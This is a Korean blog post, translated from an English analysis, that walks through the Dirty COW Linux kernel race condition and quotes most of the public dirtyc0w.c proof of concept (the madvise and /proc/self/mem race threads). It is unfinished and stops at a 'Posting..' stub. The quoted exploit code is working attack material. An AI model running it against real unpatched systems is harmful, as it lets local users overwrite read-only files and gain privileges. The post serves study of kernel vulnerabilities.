---
title: Pwnable - Dirty Cow
categories:
 - pwnable, kernel, analysis, translation
tags: pwn, kernel, exploit, page, Copy-on-Write
---

---

최신 문제를 풀고 싶은데 현재 환경상 glibc 2.29 문제나 kernel 문제는 못 풀기때문에 커널 CVE 분석글을 보면서 어느정도 커널 exploit에 발을 들이기로 했다. 문제 푸는 것도 아주 놓을 수는 없어서 문제도 간간이 풀면서 분석글을 포스팅 하려고 한다. 

원래는 휴가를 나가려고 해서 좀 쉬고 힐링 타임을 가지려고 했지만... ~~코로나 개색...~~

약 4년전에 나온 kernel CVE, `Dirty Cow`에 대해 알아보도록 하겠다.

본 분석글은 TLS를 분석할때 참고했던 `https://chao-tic.github.io/blog/2017/05/24/dirty-cow`의 게시글중에 `Dirty Cow`에 대해 정말 잘 정리되어 있는 글을 발견해서 번역 해서 포스팅하는 방향으로 진행하도록 하겠다.

영어실력이 딸리기 때문에 필자의 해석이 많이 들어갈 수 있으니 이 글을 읽고 원문 또한 읽는 것을 무척.. 추천한다.

~~이 글 읽지말고 원문만 보는것도 추천합니다~~

---


## Introduction

(Dirty COW에 대한)익스에 관한 많은 기사나 블로그 글이 있지만 정확히 Dirty COW가 커널 관점에서 어떻게 동작하는지에 대한 만족스러운 설명이 없어 포스팅을 진행하기로 했다. 

본 분석은 `https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c`의 POC를 기반으로 작성했다. 

위의 예시 코드가 익스치고는 꽤 짧은데 중요한 부분은 `/proc/self/mem`에 `write`를 호출하는 쓰레드와 `madvise(MADV_DONTNEED)`를 호출하는 쓰레드다. 이 두 쓰레드가 서로 경쟁하게 해서 기본 메모리 맵에 쓰기권한이 없는 파일이 매핑된 경우에도 직접 수정하기 위한 `write`를 할 수 있게 된다.

본 포스팅은 꽤 기술적으로 무거우니 아래의 개념을 숙지한 상태의 독자라 가정하고 진행하도록 하겠다.

- Virtual Memory
- Pages
- Page Fault
- Copy-on-Write

## How to carry out the attack

그럼, 처음부터 시작해보도록 하자. 우리의 궁극적인 목적은 파일에 `write`를 하는 것이지만 첫 코드에서 파일에 `open`를 호출할때 read-only인 `O_RDONLY` flag를 인자로 넣는다. 이렇게 하는 이유는 해당 파일에 쓰기권한이 없기때문에 fd를 가져올때 커널을 만족시키기 위한 것이다. 이렇게 fd를 가져오는데 성공하면 즉시 `mmap`을 호출한다.


```c
f=open(argv[1],O_RDONLY);
fstat(f,&st);
name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
```

`mmap`을 호출하면 해당 프로세스의 가상 주소 공간에 매핑된 파일 기반 읽기 전용 메모리를 생성한다. 이렇게 생성된 메모리는 `vm_area_struct`(Virutal Memory Area)라 불리는 커널 객체에 의해 관리된다. (해당 커널 객체에는 매핑을 지원하는 기본 파일 설명, 매핑된 페이지에 대한 읽기/쓰기 권한 등의 정보들이 들어있음)

그리고나서 `madvise`와 `write`를 수행하는 두개의 경쟁 쓰레드가 생성된다.

```c
    pthread_create(&pth1,NULL,madviseThread,argv[1]);
    pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
```

그럼 `madvise`를 호출하는 쓰레드 먼저 다뤄보도록 하겠다.

```c
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
```

기본적으로 `madvise(MADV_DONTNEED)`는 매핑에 의해 관리되는 물리 메모리를 제거한다. Copy-On-Write된 페이지의 경우에는 함수 호출 후 페이지가 지워진다. 그 후 사용자가 해당 메모리 영역을 다시 접근하려고 하면 파일 기반 매핑을 위해 디스크 (또는 페이지 캐시)에서 기존 내용이 다시 로드되거나 0으로 채워진 익명 힙 메모리가 로드된다.

리눅스 문서를 참조해보면

```
       `MADV_DONTNEED`
              Do not expect access in the near future.  (For the time being,
              the application is finished with the given range, so the
              kernel can free resources associated with it.)

              After a successful MADV_DONTNEED operation, the semantics of
              memory access in the specified region are changed: subsequent
              accesses of pages in the range will succeed, but will result
              in either repopulating the memory contents from the up-to-date
              contents of the underlying mapped file (for shared file
              mappings, shared anonymous mappings, and shmem-based
              techniques such as System V shared memory segments) or zero-
              fill-on-demand pages for anonymous private mappings.

              Note that, when applied to shared mappings, MADV_DONTNEED
              might not lead to immediate freeing of the pages in the range.
              The kernel is free to delay freeing the pages until an
              appropriate moment.  The resident set size (RSS) of the
              calling process will be immediately reduced however.

              MADV_DONTNEED cannot be applied to locked pages, Huge TLB
              pages, or VM_PFNMAP pages.  (Pages marked with the kernel-
              internal VM_PFNMAP flag are special memory areas that are not
              managed by the virtual memory subsystem.  Such pages are
              typically created by device drivers that map the pages into
              user space.)
```

라고 되어있다. 리눅스에서 `MADV_DONTNEED`의 동작은 사실 논란의 여지가 있고 POSIX 표준 1을 준수하지 않는다. 곧 알 수 있겠지만 실제로 이 동작 때문에 Dirty COW exploit이 가능해진다.

그럼 다른 쓰레드를 살펴보자.

```c
void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    /*
       You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
       >  The in the wild exploit we are aware of doesn't work on Red Hat
       >  Enterprise Linux 5 and 6 out of the box because on one side of
       >  the race it writes to /proc/self/mem, but /proc/self/mem is not
       >  writable on Red Hat Enterprise Linux 5 and 6.
     */
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<100000000;i++) {
        /*
           You have to reset the file pointer to the memory position.
         */
        lseek(f,(uintptr_t) map,SEEK_SET);
        c+=write(f,str,strlen(str));
    }
    printf("procselfmem %d\n\n", c);
}
```

먼저 `lseek`으로 `map`의 주소를 세팅한다. 그리고 아마 읽기 전용일 파일의 메모리 매핑에 속한 메모리 영역을 직접 수정을 하기 위해 `wirte`를 호출한다..?? 그리고나선 어떻게 해서든 그 수정된 것이 읽기 권한밖에 없는 파일에 전달되겠지..? 진심... 어떻게..??

## `write` on `/proc/{pid}/mem`









Posting..
